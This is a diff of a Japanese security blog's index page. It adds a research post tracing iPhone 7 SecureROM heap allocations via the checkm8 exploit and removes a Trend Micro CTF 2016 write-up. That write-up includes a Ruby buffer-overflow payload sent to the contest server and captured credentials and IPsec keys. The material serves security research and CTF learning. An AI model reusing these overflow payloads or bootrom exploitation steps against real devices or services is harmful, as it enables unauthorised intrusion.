@@ -59,6 +59,126 @@
             
             <div class="posts">
                 
+                <h1 class="content-subhead">29 Dec 2019, 21:54</h1>
+                <section class="post">
+                    <header class="post-header">
+
+                        <a href="//blog.urandom.team/post/tracing-securerom-malloc-free/" class="post-title">SecureROMのmalloc/free追跡</a>
+
+                        <p class="post-meta">
+                            
+                                By <strong class="post-author">op</strong>
+                            
+                            
+                        </p>
+                    </header>
+
+                    <div class="post-description">
+                        <h1 id="概要">概要</h1>
+<p>axi0mX氏のcheckm8公開により、広く一般にSecureROM(iPhone/iPadのブートローダー)の動的解析が可能になった。SecureROMのヒープレイアウトへの理解を深める為にヒープ関連処理を解析し、その一環としてSecureROM開始時からDFUモード起動完了までの間に発生するmalloc/freeの呼び出しをデバッガーで追跡したので、研究用として記事に残す。</p>
+<p>C97でもこの記事のコピ本を頒布予定(火曜日 南地区 リ-04b)で、間に合えば細かい話を加筆する。</p>
+<h1 id="関連記事">関連記事</h1>
+<p>checkm8の解説ではa1exdandy氏による次の記事が非常によくまとまっている。</p>
+<p><a href="https://habr.com/en/company/dsec/blog/472762/">Technical analysis of the checkm8 exploit</a></p>
+<p>上の記事でもヒープの確保シーケンスについて静的解析に基づいた解説があるが、この記事の動的解析でも上の記事と近い結果が得られた。</p>
+<h1 id="検証環境">検証環境</h1>
+<ul>
+<li>iPhone 7 (A1779)</li>
+<li>Bonobo JTAG/SWD Debug Cable</li>
+<li>ipwndfu
+<ul>
+<li>Matthew Pierson氏によるfork版</li>
+<li>commit bb3c1d618f96ce96956089823f396b777b4c46acに一部変更を加えたもの</li>
+</ul>
+</li>
+</ul>
+<h1 id="調査手順">調査手順</h1>
+<p>checkm8(ipwndfu)を使用してiPhone 7(ターゲット)からSecureROMを読み出しGhidraで解析した。解析によりいわゆるmalloc, free, memalignと思われる3関数のアドレスを特定した。</p>
+<p>ipwndfuを使用してターゲットのSWDを有効化(demote)し、Bonobo JTAG/SWD Debug Cableを使用してgdbでターゲットにアタッチした。</p>
+<p>SecureROM開始直後から実行を追跡するにはターゲットをリセットする必要があるが、通常の手順でターゲットをリセットすると、リセットによりdemotionの状態が初期化されてSWDが無効になり追跡できなくなる。このため、今回はdemote後にターゲットをreset vectorへジャンプさせてもう一度最初から起動処理を行わせて追跡した。Reset vectorへのジャンプ前に予めmalloc, free, memalignへハードウェアブレークポイントを張っておいて、それぞれへの呼び出しを監視・記録した。</p>
+<h1 id="追跡結果">追跡結果</h1>
+<h2 id="備考">備考</h2>
+<p>この章では、iPhone 7の実機から読みだした情報を引用する。この章で引用するメモリダンプのベースはDFUモード起動完了直後のもので、ベースは0x180000000である。</p>
+<h2 id="一覧">一覧</h2>
+<p>次の書式でalloc, free, memalignの呼び出しの遷移を記す。</p>
+<p>呼び出し元アドレス : 関数名(引数) =&gt; 返り値</p>
+<pre><code>000000010000f858 : free(0x00000001801b4080)
+000000010000edd0 : alloc(48)                    =&gt; 0x00000001801b4080
+000000010000ede0 : alloc(256)                   =&gt; 0x00000001801b4100
+0000000100011548 : alloc(4000)                  =&gt; 0x00000001801b4240
+00000001000115d0 : free(0x00000001801b4240)
+000000010000f124 : alloc(512)                   =&gt; 0x00000001801b4240
+000000010000d10c : alloc(234)                   =&gt; 0x00000001801b4480
+000000010000d10c : alloc(22)                    =&gt; 0x00000001801b45c0
+000000010000d10c : alloc(62)                    =&gt; 0x00000001801b4640
+000000010000d10c : alloc(198)                   =&gt; 0x00000001801b46c0
+000000010000d10c : alloc(62)                    =&gt; 0x00000001801b4800
+000000010000a9e0 : alloc(960)                   =&gt; 0x00000001801b4880
+000000010000a9f0 : alloc(16384)                 =&gt; 0x00000001801b4c80
+000000010000df08 : memalign(2048, 0x00000040)   =&gt; 0x00000001801b8d00
+000000010000d2a4 : alloc(25)                    =&gt; 0x00000001801b9540
+000000010000d2b4 : alloc(25)                    =&gt; 0x00000001801b95c0
+</code></pre><h2 id="メモ">メモ</h2>
+<h3 id="000000010000f858--free0x00000001801b4080">000000010000f858 : free(0x00000001801b4080)</h3>
+<p>このfreeは不要領域の解放のためではなく、ヒープの初期化時に使用可能な領域をリストに登録するためのもの。</p>
+<p>ヒープのベースは0x1801b4000で、空ブロック1つ(長さ0x40)と、追加しようとしているブロック自身のメタデータ(長さ0x40)が先行して配置されるため、ベース + 0x80が追加する領域の（データ部分の）オフセットになる。空ブロックは後方にも配置される。</p>
+<h3 id="000000010000edd0--alloc48---------------------0x00000001801b4080">000000010000edd0 : alloc(48)                    =&gt; 0x00000001801b4080</h3>
+<p>役割不明のバッファー。</p>
+<h3 id="000000010000ede0--alloc256--------------------0x00000001801b4100">000000010000ede0 : alloc(256)                   =&gt; 0x00000001801b4100</h3>
+<p>役割不明のバッファー。</p>
+<h3 id="0000000100011548--alloc4000-------------------0x00000001801b4240">0000000100011548 : alloc(4000)                  =&gt; 0x00000001801b4240</h3>
+<p>役割不明のバッファー。</p>
+<h3 id="00000001000115d0--free0x00000001801b4240">00000001000115d0 : free(0x00000001801b4240)</h3>
+<p>直前で確保した長さ4000のバッファーを解放。</p>
+<h3 id="000000010000f124--alloc512--------------------0x00000001801b4240">000000010000f124 : alloc(512)                   =&gt; 0x00000001801b4240</h3>
+<p>役割不明のバッファー。</p>
+<p>メモリの内容を確認すると、先頭に”host bridge”とのASCII文字列が書き込まれている。</p>
+<pre><code>001b4240  68 6f 73 74 20 62 72 69  64 67 65 00 00 00 00 00  |host bridge.....|
+001b4250  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+001b4310  0c 16 00 00 01 00 00 00  6c 16 00 00 01 00 00 00  |........l.......|
+001b4320  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 c0  |................|
+001b4330  00 00 00 02 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+001b4340  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+001b4440
+</code></pre><h3 id="000000010000d10c--alloc234--------------------0x00000001801b4480">000000010000d10c : alloc(234)                   =&gt; 0x00000001801b4480</h3>
+<p>USBのString Descriptor (Descriptor Index = 1)</p>
+<p>ApNonceとSEPNonceをHostに通知するためのもの。ASCII文字による16進表記かつ1文字あたり2バイトで表現するのでApNonceとSEPNonceの情報量に比してサイズが大きい。</p>
+<p>これ以降の追跡結果はa1exdandy氏の記事の解析結果と概ね一致する。</p>
+<h3 id="000000010000d10c--alloc22---------------------0x00000001801b45c0">000000010000d10c : alloc(22)                    =&gt; 0x00000001801b45c0</h3>
+<p>USBのString Descriptor (Manufacturer)</p>
+<h3 id="000000010000d10c--alloc62---------------------0x00000001801b4640">000000010000d10c : alloc(62)                    =&gt; 0x00000001801b4640</h3>
+<p>USBのString Descriptor (Product)</p>
+<h3 id="000000010000d10c--alloc198--------------------0x00000001801b46c0">000000010000d10c : alloc(198)                   =&gt; 0x00000001801b46c0</h3>
+<p>USBのString Descriptor (Serial Number)</p>
+<p>DFUモードではここにハードウェアとソフトウェアのバージョンや設定情報を詰め込むので長い。</p>
+<h3 id="000000010000d10c--alloc62---------------------0x00000001801b4800">000000010000d10c : alloc(62)                    =&gt; 0x00000001801b4800</h3>
+<p>USBのString Descriptor (Configuration)</p>
+<h3 id="000000010000a9e0--alloc960--------------------0x00000001801b4880">000000010000a9e0 : alloc(960)                   =&gt; 0x00000001801b4880</h3>
+<p>USBコントローラーを制御するタスクのタスク構造体。</p>
+<h3 id="000000010000a9f0--alloc16384------------------0x00000001801b4c80">000000010000a9f0 : alloc(16384)                 =&gt; 0x00000001801b4c80</h3>
+<p>USBコントローラーを制御するタスクのタスクスタック。</p>
+<p>ここの確保サイズはa1exdandy氏の記事と異なる。a1exdandy氏の記事では確保サイズが0x1000となっているのに対して、今回実機で確認できた確保サイズは0x4000(16384)だった。呼び出し箇所の周辺を調べるとmax(0x1000, 0x4000)の比較結果を確保サイズとしていた。</p>
+<h3 id="000000010000df08--memalign2048-0x00000040----0x00000001801b8d00">000000010000df08 : memalign(2048, 0x00000040)   =&gt; 0x00000001801b8d00</h3>
+<p>USBの入出力用バッファー。</p>
+<h3 id="000000010000d2a4--alloc25---------------------0x00000001801b9540">000000010000d2a4 : alloc(25)                    =&gt; 0x00000001801b9540</h3>
+<p>USBのConfiguration Descriptor</p>
+<p>a1exdandy氏の記事によればこちらがHigh-Speed用のdescriptorとのこと。書き込まれるデータは後述のFull-Speed用descriptorと同一。</p>
+<p>ipwndfu/src/checkm8_arm64.S内のgUSBDescriptorsは、ここで確保されたバッファーへのポインターを指す。</p>
+<pre><code>00088a30  40 95 1b 80 01 00 00 00  c0 95 1b 80 01 00 00 00  |@...............|
+</code></pre><h3 id="000000010000d2b4--alloc25---------------------0x00000001801b95c0">000000010000d2b4 : alloc(25)                    =&gt; 0x00000001801b95c0</h3>
+<p>USBのConfiguration Descriptor</p>
+<p>a1exdandy氏の記事によればこちらがFull-Speed用のdescriptorとのこと。</p>
+<h1 id="備考-1">備考</h1>
+<p>今回はreset vectorにジャンプすることでwarm reset(的な操作)を施してSecureROMを開始直後から追跡したが、warm reset時の状態は通常起動時と異なるため、通常起動時と挙動が一致するかどうかは不明。ただし、warm reset後でもcheckm8が成功することは確認できた。</p>
+<h1 id="編集履歴">編集履歴</h1>
+<h2 id="20191231">2019/12/31</h2>
+<p>USB関連の記述に誤りがあったため訂正した。</p>
+
+                    </div>
+                </section>
+                
                 <h1 class="content-subhead">25 Dec 2018, 18:03</h1>
                 <section class="post">
                     <header class="post-header">
@@ -490,182 +610,12 @@ Linuxカーネルはとりあえず動くものをビルドしたので、より
                     </div>
                 </section>
                 
-                <h1 class="content-subhead">17 Aug 2016, 00:17</h1>
-                <section class="post">
-                    <header class="post-header">
-
-                        <a href="//blog.urandom.team/post/tmctf2016-qual/" class="post-title">Trend Micro CTF 2016 Online qualifier</a>
-
-                        <p class="post-meta">
-                            
-                            
-                                under 
-                                <a class="post-category post-category-Write-ups" href='//blog.urandom.team/categories/Write-ups'>Write-ups</a>
-                            
-                        </p>
-                    </header>
-
-                    <div class="post-description">
-                        <p>日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われた<a href="http://www.trendmicro.co.jp/jp/sp/ctf2016_jp/">Trend Micro CTF 2016</a>のwrite-upです。</p>
-<p>urandomは4問解答し600点、92位でした。</p>
-<p>Analysis-Offensive 100をyyu、Analysis-Offensive 200、Misc 100、Misc 200をmaythが解答しました。</p>
-<h1 id="analysis---offensive-100">Analysis - Offensive 100</h1>
-<blockquote>
-<p>Category: Analysis/Offensive</p>
-<p>Points: 100</p>
-<p>Please enter key. Key is TMCTF flag.</p>
-<p>Download the file
-Decrypt the downloaded file by the following command.</p>
-<p><code>openssl enc -d -aes-256-cbc -k x0nSTZ9NrDgvCnqKhL9y -in files1.enc -out files1.zip</code></p>
-<p><code>unzip files1.zip</code></p>
-</blockquote>
-<p>この問題は巨大なJavaScriptから正解の鍵を得るというものです。
-まず、巨大なJavaScriptのうちの多くの部分は定数をGoogleで調べるなどすると、MD5を実装しているということが分かります。そして、次の3つの文字列もMD5のハッシュ値であろうという推測ができます。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ko</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;c33367701511b4f6020ec61ded352059&#34;</span>;
-
-<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ka</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;61636f697b57b5b7d389db0edb801fc3&#34;</span>;
-
-<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">kq</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;d2172edf24129e06f3913376a12919a4&#34;</span>;
-</code></pre></div><p>これらをまたGoogleで調べると、それぞれ次のような文字列であることが分かります。</p>
-<ul>
-<li><code>c33367701511b4f6020ec61ded352059</code> → <code>654321</code></li>
-<li><code>61636f697b57b5b7d389db0edb801fc3</code> → <code>qwerty</code></li>
-<li><code>d2172edf24129e06f3913376a12919a4</code> → <code>admin</code></li>
-</ul>
-<p>そして次の処理でこれらの文字列を変数<code>nl</code>に従って並び換えているということが分かります。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
-<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">f</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">length</span>; ) {
-    <span style="color:#a6e22e">c</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">nl</span>[<span style="color:#f92672">++</span><span style="color:#a6e22e">f</span>]];
-    <span style="color:#a6e22e">d</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">nl</span>[<span style="color:#f92672">++</span><span style="color:#a6e22e">f</span>]];
-    <span style="color:#a6e22e">e</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">nl</span>[<span style="color:#f92672">++</span><span style="color:#a6e22e">f</span>]];
-}
-
-<span style="color:#75715e">// ......中略......
-</span><span style="color:#75715e"></span>
-<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">nl</span> <span style="color:#f92672">=</span> [ <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0</span> ];
-</code></pre></div><p>最終的にフラグは<code>TMCTF{q6r4dy5ei2na1twm3}</code>でした。</p>
-<h1 id="analysis---offensive-200">Analysis - Offensive 200</h1>
-<blockquote>
-<p>Category: Analysis - offensive</p>
-<p>Points: 200</p>
-<p>This challenge is composed of a simple remote overflow of a global array. The server address is 52.197.128.90 and the vulnerable application listens on TCP port 80-85. Each port has the same behavior so you can select one of them.</p>
-<p>The following code contains a bug that can be exploited to read back a flag:</p>
-</blockquote>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> pwned;
-<span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">1024</span>];
-
-DWORD WINAPI <span style="color:#a6e22e">CallBack</span>(LPVOID lpParameter) {
-	pwned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-	ZeroMemory(buffer, <span style="color:#ae81ff">1024</span>);
-	SOCKET <span style="color:#f92672">*</span>sock <span style="color:#f92672">=</span> (SOCKET <span style="color:#f92672">*</span>)lpParameter;
-	SOCKET _sock <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>sock;
-	send(_sock, <span style="color:#e6db74">&#34;Welcome&#34;</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0</span>);
-	<span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-	ret <span style="color:#f92672">=</span> recv(_sock, buffer, <span style="color:#ae81ff">1028</span>, <span style="color:#ae81ff">0</span>);
-	printf(<span style="color:#e6db74">&#34;[x] RET: %d.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ret);
-	printf(<span style="color:#e6db74">&#34;[x] PWNED: 0x%x.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pwned);
-	Sleep(<span style="color:#ae81ff">1</span>);
-	<span style="color:#66d9ef">if</span> (((pwned <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFFFF</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xc0fe</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x7eaf</span> <span style="color:#f92672">&amp;&amp;</span> (((pwned <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFF</span>)<span style="color:#f92672">^</span><span style="color:#ae81ff">0x1a1a</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xdae4</span>)) {
-
-			send(_sock, <span style="color:#e6db74">&#34;PWNED&#34;</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0</span>);
-			ReadAndReturn(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;key.txt&#34;</span>, _sock);
-			closesocket(_sock);
-			<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-	}
-	<span style="color:#66d9ef">else</span> {
-		send(_sock, <span style="color:#e6db74">&#34;GO AWAY&#34;</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0</span>);
-		closesocket(_sock);
-	}
-
-	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
- }
-</code></pre></div><blockquote>
-<p>Craft a packet that would return a valid flag. Good luck!</p>
-</blockquote>
-<p><code>buffer</code>が1024バイトしか確保されていないにもかかわらず、11行目で <code>ret = recv(_sock, buffer, 1028, 0);</code> と1028バイト読み込むようになっている。したがって、1025-1028バイトの範囲に特定のバイト列を仕込めばよい。満たすべき条件は15行目のif文。</p>
-<p>なぜか <code>nc</code> が1024バイトで送信を打ち切ってしまったので、Rubyで書いた。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;socket&#39;</span>
-
-<span style="color:#66d9ef">HOST</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;52.197.128.90&#39;</span>
-port <span style="color:#f92672">=</span> (<span style="color:#ae81ff">80</span><span style="color:#f92672">..</span><span style="color:#ae81ff">85</span>)<span style="color:#f92672">.</span>to_a<span style="color:#f92672">.</span>sample
-
-puts <span style="color:#e6db74">&#34;connecting </span><span style="color:#e6db74">#{</span><span style="color:#66d9ef">HOST</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">#{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
-sock <span style="color:#f92672">=</span> <span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#39;52.197.128.90&#39;</span>, port)
-
-payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\xc0\x51\xbe</span><span style="color:#e6db74">&#34;</span>
-
-sock<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">8</span>)
-sock<span style="color:#f92672">.</span>send(payload, <span style="color:#ae81ff">0</span>)
-<span style="color:#66d9ef">while</span> r <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>gets
-  puts r
-<span style="color:#66d9ef">end</span>
-</code></pre></div><p>そして正解をメモし忘れた 😇</p>
-<h1 id="misc-100">Misc 100</h1>
-<blockquote>
-<p>Category: Misc(iot and network)</p>
-<p>Points: 100</p>
-<p>Please analyze this pcap.</p>
-</blockquote>
-<p>pcapファイルが渡される。中身を見ると、IPsecな通信と、普通にtelnetしている通信がある。</p>
-<p>Wiresharkでtelnetでのやりとりをテキストとして見ると、 <code>ip xfrm state</code>を叩いている箇所がある。</p>
-<pre><code>.]0;reds@localhost:~.[reds@localhost ~]$ sudo ip xfrm state
-.sudo ip xfrm state
-[sudo] password for reds: ynwa
-.
-src 1.1.1.11 dst 1.1.1.10
-	proto esp spi 0xfab21777 reqid 16389 mode tunnel
-	replay-window 32 flag 20
-	auth hmac(sha1) 0x11cf27c5b3357a5fd5d26d253fffd5339a99b4d1
-	enc cbc(aes) 0xfa19ff5565b1666d3dd16fcfda62820da44b2b51672a85fed155521bedb243ee
-src 1.1.1.10 dst 1.1.1.11
-	proto esp spi 0xbfd6dc1c reqid 16389 mode tunnel
-	replay-window 32 flag 20
-	auth hmac(sha1) 0x829b457814bd8856e51cce1d745619507ca1b257
-	enc cbc(aes) 0x2a340c090abec9186c841017714a233fba6144b3cb20c898db4a30f02b0a003d
-src 1.1.1.10 dst 1.1.1.11
-	proto esp spi 0xeea1503c reqid 16389 mode tunnel
-	replay-window 32 flag 20
-	auth hmac(sha1) 0x951d2d93498d2e7479c28c1bcc203ace34d7fcde
-	enc cbc(aes) 0x6ec6072dd25a6bcb7b9b3b516529acb641a1b356999f791eb971e57cc934a5eb
-src 1.1.1.11 dst 1.1.1.10
-	proto esp spi 0xd4d2074d reqid 16389 mode tunnel
-	replay-window 32 flag 20
-	auth hmac(sha1) 0x100a0b23fc006c867455506843cc96ad26026ec0
-	enc cbc(aes) 0xdcfbc7d33d3c606de488c6efac4624ed50b550c88be0d62befb049992972cca6
-</code></pre><p>この情報を元に、IPsecの通信の中身を見ることができる。すると、HTTPでいくつかやりとりをしている箇所が見つかる。その中に <code>flag.png</code> というファイルのダウンロードが含まれている。これを抽出して開くと、フラグが書かれている。</p>
-<h1 id="misc-200">Misc 200</h1>
-<blockquote>
-<p>Category: Misc(iot and network)</p>
-<p>Points: 200</p>
-<p>find all LTE bands this phone supported.</p>
-<p>the final answer will be from small to big, and use &lsquo;,&rsquo; to seperate without spaces.</p>
-<p>example&gt; if the answer is band 1 and 2 and 3, the key should be: &ldquo;TMCTF{1,2,3}&rdquo;</p>
-</blockquote>
-<p><code>ModemSettings.txt</code> というファイルが与えられ、そこからその携帯電話の対応しているLTEバンドを答える。</p>
-<p>この <code>ModemSettings.txt</code> はどうやら NV-items_reader_writerというソフトウェアによる出力らしい。</p>
-<p>LTEのバンドに関する設定は&quot;6828&quot;番にあるという。該当する箇所を引用する。</p>
-<pre><code>6828 (0x1AAC)   -   OK
-FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-</code></pre><p>ここに書き込まれている数値が対応LTEバンドを表している。ビット単位で読んで、あるビットが立っていたら、そのビットと対応するバンドをサポートしていることを意味している。最右ビットがバンド1に対応する。</p>
-<p>寝起きでつらいワンライナーを書いておしまい。エンディアンに注意。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; puts (<span style="color:#ae81ff">0x031F1DFF</span>)<span style="color:#f92672">.</span>to_s(<span style="color:#ae81ff">2</span>)<span style="color:#f92672">.</span>reverse<span style="color:#f92672">.</span>split(<span style="color:#e6db74">//</span>)<span style="color:#f92672">.</span>map { <span style="color:#f92672">|</span>c<span style="color:#f92672">|</span> i <span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>; <span style="color:#f92672">[</span>c, i<span style="color:#f92672">]</span> }<span style="color:#f92672">.</span>select { <span style="color:#f92672">|</span>x<span style="color:#f92672">|</span> x<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span> }<span style="color:#f92672">.</span>map { <span style="color:#f92672">|</span>x<span style="color:#f92672">|</span> x<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">]</span> }<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;,&#39;</span>)
-</code></pre></div>
-                    </div>
-                </section>
-                
             </div>
             
 <div class="pagination">
   <nav role="pagination" class="post-list-pagination">
       
-    <span class="post-list-pagination-item post-list-pagination-item-current">Page 1 of 2</span>
+    <span class="post-list-pagination-item post-list-pagination-item-current">Page 1 of 3</span>
     
       <a href="/page/2/" class="post-list-pagination-item pure-button post-list-pagination-item-next">
         Older&nbsp;<i class="fa fa-angle-double-right"></i>
